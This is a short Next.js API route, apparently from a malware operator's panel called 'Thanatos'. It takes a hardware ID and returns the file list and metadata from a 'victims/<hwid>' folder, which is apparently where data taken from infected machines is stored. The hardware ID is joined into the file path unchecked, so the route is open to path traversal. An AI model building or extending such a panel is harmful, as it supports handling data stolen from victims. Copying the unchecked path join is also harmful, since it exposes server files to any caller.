// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'
import fs from 'fs';

type Info = {
  name: string,
  info: fs.Stats,
}

type Data = {
  files_infos: Info[]
}

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  const { hwid } = req.query;
  if (!hwid) {
    res.status(400).end();
    return;
  }
  const files = fs.readdirSync('/home/nestyles/Documents/Thanatos/server/victims/' + hwid);
  const files_infos = files.map(file => {
    let info: Info = {
      name: file,
      info: fs.statSync('/home/nestyles/Documents/Thanatos/server/victims/' + hwid + '/' + file)
    };
    console.log(info);
    return info;
  });

  res.status(200).json({ files_infos : files_infos })
}
